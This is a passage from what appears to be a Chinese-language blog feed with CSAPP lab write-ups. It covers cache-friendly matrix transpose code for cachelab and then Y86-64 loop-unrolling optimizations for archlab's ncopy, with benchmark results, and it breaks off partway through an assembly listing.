8        1653</span><br><span class="line">Trans perf 61x67          10.0        10        1953</span><br><span class="line">          Total points    48.4        53</span><br></pre></td></tr></table></figure><p>32×32 的 miss 略微提升，但是 64×64 的 miss 已显著下降（4613→1653）。</p><p> 进一步的优化需要打印出 64×64 的组索引数值数组（这里本文假设了 $A[i][j]$ 和 $B[i][j]$ 的组索引相同，直觉上是冲突最多的，未经过严格证明）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 01 01 01 01 01 01 01 01 02 ...</span><br><span class="line">08 08 08 08 08 08 08 08 09 09 09 09 09 09 09 09 0a ...</span><br><span class="line">10 10 10 10 10 10 10 10 11 11 11 11 11 11 11 11 12 ...</span><br><span class="line">18 18 18 18 18 18 18 18 19 19 19 19 19 19 19 19 1a ...</span><br><span class="line">00 00 00 00 00 00 00 00 01 01 01 01 01 01 01 01 02 ...</span><br><span class="line">08 08 08 08 08 08 08 08 09 09 09 09 09 09 09 09 0a ...</span><br><span class="line">10 10 10 10 10 10 10 10 11 11 11 11 11 11 11 11 12 ...</span><br><span class="line">18 18 18 18 18 18 18 18 19 19 19 19 19 19 19 19 1a ...</span><br><span class="line">00 00 00 00 00 00 00 00 01 01 01 01 01 01 01 01 02 ...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>观察可以得出以下结论：</p><ol><li>当 8×8 块的左上角坐标<strong>不在</strong>对角线上时，$A[i][j]$ 的组索引和 $B[j][i]$ 的组索引没有交集。</li><li>当 8×8 块的左上角坐标<strong>在</strong>对角线上时，此时冲突最为严重。</li></ol><p>针对观察 1 的结论：在读完 A 的前 4 列后，A 的最后 4 行已被缓存而不会被覆盖。然而，在上一实现中，处理后 4 列时又从前 4 行开始读 A，浪费了已缓存的后 4 行。</p><p>所以，这里对于处理 A 的后 4 列时，从后往前读 A 的行，充分利用缓存。过程转变如下图所示：</p><img src="/2020/02/23/CSAPP-cachelab/traversals.png"><p>此外，由于每次只读 A 每行的 4 列，实际上用于缓存 A 的局部变量仅需 4 个。但这样的话会浪费上限为 12 的限制。因此，对于额外的 4 个局部变量可缓存 8×8 块<strong>第一行</strong>的后 4 列。这样充分利用了高速缓存的 8 个 int，从而在处理第一行的后 4 列时不用再从内存读取而避免了 miss 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transpose_submit</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span> </span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> min(a,b) ((a)&lt;(b)?(a):(b))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i,l,r) for(i=(l);i&lt;(r);++i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> repd(i,l,r,d) for(i=(l);i&lt;(r);i+=(d))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> per(i,l,r) for(i=(r)-1;i&gt;=(l);--i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> perd(i,l,r,d) for(i=(r)-1;i&gt;=(l);i-=(d))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> x, y, i, j, a[<span class="number">8</span>];</span><br><span class="line">repd(x, <span class="number">0</span>, N, <span class="number">8</span>)</span><br><span class="line">repd(y, <span class="number">0</span>, M, <span class="number">8</span>) &#123;</span><br><span class="line">rep(j, y, min(M, y + <span class="number">8</span>)) a[j - y] = A[x][j];</span><br><span class="line">rep(j, y, min(M, y + <span class="number">4</span>)) B[j][x] = a[j - y];</span><br><span class="line">rep(i, x + <span class="number">1</span>, min(N, x + <span class="number">8</span>)) &#123;</span><br><span class="line">rep(j, y, min(M, y + <span class="number">4</span>)) a[j - y] = A[i][j];</span><br><span class="line">rep(j, y, min(M, y + <span class="number">4</span>)) B[j][i] = a[j - y];</span><br><span class="line">&#125;</span><br><span class="line">per(i, x + <span class="number">1</span>, min(N, x + <span class="number">8</span>)) &#123;</span><br><span class="line">rep(j, y + <span class="number">4</span>, min(M, y + <span class="number">8</span>)) a[j - y - <span class="number">4</span>] = A[i][j];</span><br><span class="line">rep(j, y + <span class="number">4</span>, min(M, y + <span class="number">8</span>)) B[j][i] = a[j - y - <span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line">rep(j, y + <span class="number">4</span>, min(M, y + <span class="number">8</span>)) B[j][x] = a[j - y];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <code>make &amp;&amp; ./driver.py</code> 测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Cache Lab summary:</span><br><span class="line">                        Points   Max pts      Misses</span><br><span class="line">Csim correctness          27.0        27</span><br><span class="line">Trans perf 32x32           7.8         8         309</span><br><span class="line">Trans perf 64x64           7.3         8        1357</span><br><span class="line">Trans perf 61x67          10.0        10        1940</span><br><span class="line">          Total points    52.1        53</span><br></pre></td></tr></table></figure><p>剩余优化在于处于对角线的 8×8 分块，其冲突主要在于 A 的缓存组索引和 B 的缓存组索引相同。这里只需要针对这种情况构造一种冲突较少的方案即可。</p><p>本文构造的方案为：</p><ol><li>将 A 的前 4 行依次存储到 B 的前 4 行（<strong>不转置</strong>），此时缓存中均是 $B_u $。转置 B 前 4 行的两个 4×4 子矩阵。由于缓存的存在，转置子矩阵不会导致任何的 miss。</li><li>同样处理后 4 行。注意，此时缓存的是 $B_d$。</li><li>剩下的就是交换 $B_u$ 的右子矩阵和 $B_d$ 的左子矩阵，利用 8 个局部变量容易做到。</li></ol><img src="/2020/02/23/CSAPP-cachelab/pipeline.png"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transpose_submit</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span> </span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> min(a,b) ((a)&lt;(b)?(a):(b))</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> rep(i,l,r) for(i=(l);i&lt;(r);++i)</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> repd(i,l,r,d) for(i=(l);i&lt;(r);i+=(d))</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> per(i,l,r) for(i=(r)-1;i&gt;=(l);--i)</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> perd(i,l,r,d) for(i=(r)-1;i&gt;=(l);i-=(d))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> x, y, i, j, a[<span class="number">8</span>];</span><br><span class="line">    repd(x, <span class="number">0</span>, N, <span class="number">8</span>) repd(y, <span class="number">0</span>, M, <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> (x != y || x + <span class="number">8</span> &gt; min(N, M) || y + <span class="number">8</span> &gt; min(N, M)) &#123;</span><br><span class="line">            rep(j, y, min(M, y + <span class="number">8</span>)) a[j - y] = A[x][j];</span><br><span class="line">            rep(j, y, min(M, y + <span class="number">4</span>)) B[j][x] = a[j - y];</span><br><span class="line"></span><br><span class="line">            rep(i, x + <span class="number">1</span>, min(N, x + <span class="number">8</span>)) &#123;</span><br><span class="line">                rep(j, y, min(M, y + <span class="number">4</span>)) a[j - y] = A[i][j];</span><br><span class="line">                rep(j, y, min(M, y + <span class="number">4</span>)) B[j][i] = a[j - y];</span><br><span class="line">            &#125;</span><br><span class="line">            y += <span class="number">4</span>;</span><br><span class="line">            per(i, x + <span class="number">1</span>, min(N, x + <span class="number">8</span>)) &#123;</span><br><span class="line">                rep(j, y, min(M, y + <span class="number">4</span>)) a[j - y] = A[i][j];</span><br><span class="line">                rep(j, y, min(M, y + <span class="number">4</span>)) B[j][i] = a[j - y];</span><br><span class="line">            &#125;</span><br><span class="line">            rep(j, y, min(M, y + <span class="number">4</span>)) B[j][x] = a[<span class="number">4</span> + j - y];</span><br><span class="line">            y -= <span class="number">4</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a[<span class="number">0</span>] = x; x = y; y = a[<span class="number">0</span>];</span><br><span class="line">            <span class="comment">// Upper part</span></span><br><span class="line">            rep(i, <span class="number">0</span>, <span class="number">4</span>) &#123;</span><br><span class="line">                rep(j, <span class="number">0</span>, <span class="number">8</span>) a[j] = A[y + i][x + j];</span><br><span class="line">                rep(j, <span class="number">0</span>, <span class="number">8</span>) B[x + i][y + j] = a[j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// trans(0, 0)</span></span><br><span class="line">            rep(i, <span class="number">0</span>, <span class="number">4</span>) rep(j, i + <span class="number">1</span>, <span class="number">4</span>) &#123;</span><br><span class="line">                a[<span class="number">0</span>] = B[x + i][y + j];</span><br><span class="line">                B[x + i][y + j] = B[x + j][y + i];</span><br><span class="line">                B[x + j][y + i] = a[<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// trans(0, 4)</span></span><br><span class="line">            y += <span class="number">4</span>;</span><br><span class="line">            rep(i, <span class="number">0</span>, <span class="number">4</span>) rep(j, i + <span class="number">1</span>, <span class="number">4</span>) &#123;</span><br><span class="line">                a[<span class="number">0</span>] = B[x + i][y + j];</span><br><span class="line">                B[x + i][y + j] = B[x + j][y + i];</span><br><span class="line">                B[x + j][y + i] = a[<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            y -= <span class="number">4</span>;</span><br><span class="line">            <span class="comment">// Lower part</span></span><br><span class="line">            rep(i, <span class="number">4</span>, <span class="number">8</span>) &#123;</span><br><span class="line">                rep(j, <span class="number">0</span>, <span class="number">8</span>) a[j] = A[y + i][x + j];</span><br><span class="line">                rep(j, <span class="number">0</span>, <span class="number">8</span>) B[x + i][y + j] = a[j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// trans(4, 0)</span></span><br><span class="line">            x += <span class="number">4</span>;</span><br><span class="line">            rep(i, <span class="number">0</span>, <span class="number">4</span>) rep(j, i + <span class="number">1</span>, <span class="number">4</span>) &#123;</span><br><span class="line">                a[<span class="number">0</span>] = B[x + i][y + j];</span><br><span class="line">                B[x + i][y + j] = B[x + j][y + i];</span><br><span class="line">                B[x + j][y + i] = a[<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// trans(4, 4)</span></span><br><span class="line">            y += <span class="number">4</span>;</span><br><span class="line">            rep(i, <span class="number">0</span>, <span class="number">4</span>) rep(j, i + <span class="number">1</span>, <span class="number">4</span>) &#123;</span><br><span class="line">                a[<span class="number">0</span>] = B[x + i][y + j];</span><br><span class="line">                B[x + i][y + j] = B[x + j][y + i];</span><br><span class="line">                B[x + j][y + i] = a[<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            y -= <span class="number">4</span>;</span><br><span class="line">            x -= <span class="number">4</span>;</span><br><span class="line">            <span class="comment">// swap Bur, Bdl</span></span><br><span class="line">            rep(i, <span class="number">0</span>, <span class="number">4</span>) &#123;</span><br><span class="line">                rep(j, <span class="number">0</span>, <span class="number">4</span>) a[j] = B[x + <span class="number">4</span> + i][y + j];</span><br><span class="line">                rep(j, <span class="number">4</span>, <span class="number">8</span>) a[j] = B[x + i][y + j];</span><br><span class="line">                rep(j, <span class="number">4</span>, <span class="number">8</span>) B[x + i][y + j] = a[j - <span class="number">4</span>];</span><br><span class="line">                rep(j, <span class="number">0</span>, <span class="number">4</span>) B[x + <span class="number">4</span> + i][y + j] = a[j + <span class="number">4</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            a[<span class="number">0</span>] = x; x = y; y = a[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <code>make &amp;&amp; ./driver.py</code> 测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Cache Lab summary:</span><br><span class="line">                        Points   Max pts      Misses</span><br><span class="line">Csim correctness          27.0        27</span><br><span class="line">Trans perf 32x32           8.0         8         261</span><br><span class="line">Trans perf 64x64           8.0         8        1261</span><br><span class="line">Trans perf 61x67          10.0        10        1966</span><br><span class="line">          Total points    53.0        53</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;h3 id=&quot;Part-A-Cache-Simuator&quot;&gt;&lt;a href=&quot;#Part-A-Cache-Simuator&quot; class=&quot;he
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CSAPP - archlab</title>
    <link href="http://mcginn7.github.io/2020/02/21/CSAPP-archlab/"/>
    <id>http://mcginn7.github.io/2020/02/21/CSAPP-archlab/</id>
    <published>2020-02-21T13:17:36.000Z</published>
    <updated>2020-02-21T15:53:52.882Z</updated>
    
    <content type="html"><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul><li>学习流水线化的 Y86-64 处理器的设计和实现，深刻理解<strong>流水线冒险</strong>。</li><li>学习<strong>循环展开</strong>，理解其对程序性能的影响。</li></ul><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h3><h4 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h4><p>使用 Y86-64 指令集，编写关于 sum_list, rsum_list 和 copy_block 函数的 Y86-64 程序。</p><h4 id="做法"><a href="#做法" class="headerlink" title="做法"></a>做法</h4><p>参考书本<strong>图 4-7</strong> 即可，实现也较为简单。</p><h3 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h3><h4 id="要求-1"><a href="#要求-1" class="headerlink" title="要求"></a>要求</h4><p>使用硬件控制语言（HCL）修改 sim/seq/seq-full.hcl，使得处理器支持 iaddq 指令。</p><h4 id="做法-1"><a href="#做法-1" class="headerlink" title="做法"></a>做法</h4><p>iaddq 指令将立即数和寄存器相加，并将结果写回寄存器。</p><p>具体参考 irmovq 指令的实现即可。</p><h3 id="Part-C"><a href="#Part-C" class="headerlink" title="Part C"></a>Part C</h3><h4 id="要求-2"><a href="#要求-2" class="headerlink" title="要求"></a>要求</h4><p>在 ncopy.ys 中用 Y86-64 指令实现函数 ncopy：复制 src 到 dst，同时统计并返回其中正数的数量。</p><p>满分要求达到 CPE &lt; 7.50。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * ncopy - copy src to dst, returning number of positive ints</span></span><br><span class="line"><span class="comment"> * contained in src array.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">word_t</span> ncopy(<span class="keyword">word_t</span> *src, <span class="keyword">word_t</span> *dst, <span class="keyword">word_t</span> len) &#123;</span><br><span class="line"><span class="keyword">word_t</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">word_t</span> val;</span><br><span class="line">    <span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">val = *src++;</span><br><span class="line">        *dst = val;</span><br><span class="line">        <span class="keyword">if</span> (val &gt; <span class="number">0</span>) </span><br><span class="line">            count++;</span><br><span class="line">        len--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="做法-2"><a href="#做法-2" class="headerlink" title="做法"></a>做法</h4><p>首先实现最朴素的循环体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># %rdi = src, %rsi = dst, %rdx = len</span><br><span class="line">ncopy:</span><br><span class="line">xorq %rax,%rax</span><br><span class="line">andq %rdx,%rdx# len &gt; 0?</span><br><span class="line">jle Done</span><br><span class="line">Loop:</span><br><span class="line">mrmovq (%rdi), %r10# get *src</span><br><span class="line">rmmovq %r10, (%rsi)# set *dst</span><br><span class="line">andq %r10, %r10# val &gt; 0?</span><br><span class="line">jle Npos</span><br><span class="line">iaddq $1, %rax# count++</span><br><span class="line">Npos:</span><br><span class="line">iaddq $8, %rdi# src++</span><br><span class="line">iaddq $8, %rsi# dst++</span><br><span class="line">iaddq $-1, %rdx# len--</span><br><span class="line">jne Loop</span><br></pre></td></tr></table></figure><p>该实现使用 <code>./benchmark.pl</code> 测试， CPE = 11.70。该实现需要经过优化来达到满分要求。</p><p>先简单介绍<strong>循环展开（Loop Unrolling）</strong>，通过增加每次迭代计算的元素数量，从而减少循环的迭代次数：</p><ol><li><p>减少循环不直接有助于计算的操作数量，比如循环索引。</p><p>不严谨地说，就是关键操作（比如乘法操作）数量不变，但是循环变量的加法减少了，这样就可以减少不必要的操作数量。</p></li><li><p>循环展开可以改变代码，有可能减少流水线冒险。</p></li></ol><p>在朴素版本中，<code>mrmovq (%rdi), %r10</code> 和 <code>rmmovq %r10, (%rsi)</code> 存在数据相关：需要先将 *src 读取到寄存器 %r10 中，进而才能读取 %r10 值保存到 *dst。处理器通过暂停指令来处理该情况，参考下图情形：</p><img src="/2020/02/21/CSAPP-archlab/bubble.png" title="流水线暂停"><p>由于有<strong>转发</strong>机制，流水线处理器可以减少暂停的周期数，而不是图上的 3 个周期。</p><p>下面实现 2×1 循环展开：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">ncopy:</span><br><span class="line">xorq %rax, %rax</span><br><span class="line">iaddq $-2, %rdx# len - 2 &gt;= 0?</span><br><span class="line">jl Rem</span><br><span class="line">Loop:</span><br><span class="line">mrmovq (%rdi), %r8# get *src</span><br><span class="line">mrmovq 8(%rdi), %r9# get *(src + 1)</span><br><span class="line">rmmovq %r8, (%rsi)# set *dst</span><br><span class="line">rmmovq %r9, 8(%rsi)# set *(dst + 1)</span><br><span class="line">andq %r8, %r8# val &gt; 0?</span><br><span class="line">jle LNP8</span><br><span class="line">iaddq $1, %rax# count++</span><br><span class="line">LNP8:</span><br><span class="line">andq %r9, %r9# val &gt; 0?</span><br><span class="line">jle LNP9</span><br><span class="line">iaddq $1, %rax# count++</span><br><span class="line">LNP9:</span><br><span class="line">iaddq $16, %rdi# src += 2</span><br><span class="line">iaddq $16, %rsi# dst += 2</span><br><span class="line">iaddq $-2, %rdx# len -= 2</span><br><span class="line">jge Loop</span><br><span class="line"></span><br><span class="line">Rem:</span><br><span class="line">iaddq $2, %rdx</span><br><span class="line">jle Done</span><br><span class="line"></span><br><span class="line">mrmovq (%rdi), %r8</span><br><span class="line">rmmovq %r8, (%rsi)</span><br><span class="line">andq %r8, %r8</span><br><span class="line">jle Done</span><br><span class="line">iaddq $1, %rax</span><br></pre></td></tr></table></figure><p>该实现使用 <code>./benchmark.pl</code> 测试， CPE = 8.87。</p><p>注意，此处将余数放到最后处理，可以去掉 %rdi, %rsi 和 %rdx 的加法操作，从而提高 CPE。</p><p>其中，将 <code>iaddq $16, %rdi</code> 置于 <code>mrmovq 8(%rdi), %r9</code>  和 <code>rmmovq %r8, (%rsi)</code> 之间，CPE 不会提升。此外，插入到 <code>andq</code> 和 <code>jle</code> 之间也不会提升 CPE。</p><p>因此，可得出结论 <code>mrmovq</code> 和 <code>rmmovq</code> 如果存在数据相关，只会<strong>暂停一个周期</strong>（即插入一个 bubble）。</p><p>进一步的优化考虑使用更多的寄存器来展开循环。因为 Y86-64 指令集仅支持 15 个寄存器，去掉已使用的寄存器和栈寄存器，剩余 10 个寄存器可用。所以最多能够编写 10×1 循环展开程序。</p><p>参考 2×1 展开，余数部分<strong>手动处理</strong>而不依赖循环结构，可以进一步减少循环索引和循环指针的加法操作。手动处理的话，需要知道余数大小，然后跳转到相应的位置进行处理。这里可以使用<strong>类似二分查找</strong>思想：条件跳转指令有 <code>jl</code>, <code>je</code> 和 <code>jg</code>，可以确定 2 个区间和 1 个值。</p><p>知道余数大小后，类似 C 语言中 switch 选择语句依次处理剩余部分：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (Remainder) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">9</span>: val=*src++; *dst++=val; count += val&gt;<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8</span>: val=*src++; *dst++=val; count += val&gt;<span class="number">0</span>;</span><br><span class="line">       ...</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: val=*src++; *dst++=val; count += val&gt;<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>10×1 循环展开+余数手动处理版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line">ncopy:</span><br><span class="line">iaddq $-10, %rdx</span><br><span class="line">jl Rem</span><br><span class="line"></span><br><span class="line">Loop:</span><br><span class="line">mrmovq (%rdi), %r8</span><br><span class="line">mrmovq 8(%rdi), %r9</span><br><span class="line">mrmovq 16(%rdi), %r10</span><br><span class="line">mrmovq 24(%rdi), %r11</span><br><span class="line">mrmovq 32(%rdi), %r12</span><br><span class="line">mrmovq 40(%rdi), %r13</span><br><span class="line">mrmovq 48(%rdi), %r14</span><br><span class="line">mrmovq 56(%rdi), %rcx</span><br><span class="line">mrmovq 64(%rdi), %rbx</span><br><span class="line">mrmovq 72(%rdi), %rbp</span><br><span class="line">rmmovq %r8, (%rsi)</span><br><span class="line">rmmovq %r9, 8(%rsi)</span><br><span class="line">rmmovq %r10, 16(%rsi)</span><br><span class="line">rmmovq %r11, 24(%rsi)</span><br><span class="line">rmmovq %r12, 32(%rsi)</span><br><span class="line">rmmovq %r13, 40(%rsi)</span><br><span class="line">rmmovq %r14, 48(%rsi)</span><br><span class="line">rmmovq %rcx, 56(%rsi)</span><br><span class="line">rmmovq %rbx, 64(%rsi)</span><br><span class="line">rmmovq %rbp, 72(%rsi)</span><br><span class="line">andq %r8, %r8</span><br><span class="line">jle 